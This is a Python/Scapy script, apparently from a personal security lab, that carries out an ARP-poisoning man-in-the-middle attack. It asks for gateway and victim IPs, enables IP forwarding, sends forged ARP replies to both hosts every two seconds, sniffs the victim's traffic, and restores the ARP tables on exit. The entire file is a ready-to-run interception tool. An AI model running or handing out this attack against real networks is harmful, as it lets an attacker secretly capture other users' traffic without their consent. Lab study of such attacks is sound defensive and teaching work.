#!/usr/bin/env python3
"""
ARP MitM Attack
Autor  : Edgardy Olivero - 20250704
Lab    : EGALDITO_LAB
Uso    : sudo python3 arp_mitm.py

Objetivo: Interceptar el tráfico entre la víctima
          y el gateway mediante envenenamiento ARP.
"""

from scapy.all import *
import time, sys, os, threading

IFACE = "eth0.10"


def get_mac(ip):
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        iface=IFACE,
        timeout=3,
        verbose=False,
    )
    if not ans:
        sys.exit(f"[-] No se pudo resolver MAC de {ip}")
    return ans[0][1][ARP].hwsrc


# Resolución de IPs
GW_IP = input("[?] IP del Gateway  : ")
VIC_IP = input("[?] IP de la Víctima: ")

print(f"\n[*] Resolviendo MACs...")
GW_MAC = get_mac(GW_IP)
VIC_MAC = get_mac(VIC_IP)
ATK_MAC = get_if_hwaddr(IFACE)

print(f"[+] Gateway  {GW_IP}  →  {GW_MAC}")
print(f"[+] Víctima  {VIC_IP}  →  {VIC_MAC}")
print(f"[+] Atacante            →  {ATK_MAC}")

# Habilitar IP forwarding para no cortar el tráfico
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print("[+] IP Forwarding ON\n")


def poison():
    while not stop.is_set():
        # Decirle a la víctima que el GW está en nuestra MAC
        sendp(
            Ether(dst=VIC_MAC)
            / ARP(op=2, pdst=VIC_IP, hwdst=VIC_MAC, psrc=GW_IP, hwsrc=ATK_MAC),
            iface=IFACE,
            verbose=False,
        )
        # Decirle al GW que la víctima está en nuestra MAC
        sendp(
            Ether(dst=GW_MAC)
            / ARP(op=2, pdst=GW_IP, hwdst=GW_MAC, psrc=VIC_IP, hwsrc=ATK_MAC),
            iface=IFACE,
            verbose=False,
        )
        time.sleep(2)


def restore():
    print("\n[*] Restaurando tablas ARP...")
    for _ in range(5):
        sendp(
            Ether(dst=VIC_MAC)
            / ARP(op=2, pdst=VIC_IP, hwdst=VIC_MAC, psrc=GW_IP, hwsrc=GW_MAC),
            iface=IFACE,
            verbose=False,
        )
        sendp(
            Ether(dst=GW_MAC)
            / ARP(op=2, pdst=GW_IP, hwdst=GW_MAC, psrc=VIC_IP, hwsrc=VIC_MAC),
            iface=IFACE,
            verbose=False,
        )
        time.sleep(0.3)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[+] ARP restaurado. IP Forwarding OFF.")


stop = threading.Event()
t = threading.Thread(target=poison, daemon=True)
t.start()

print("[*] ARP Poisoning activo. Mostrando tráfico interceptado...")
print("[*] Ctrl+C para detener\n")

try:
    sniff(
        iface=IFACE,
        filter=f"ip host {VIC_IP}",
        prn=lambda p: (
            print(f"  [>>] {p[IP].src:15} → {p[IP].dst:15}  proto={p[IP].proto}")
            if p.haslayer(IP)
            else None
        ),
        store=False,
        stop_filter=lambda _: stop.is_set(),
    )
except KeyboardInterrupt:
    stop.set()
    restore()
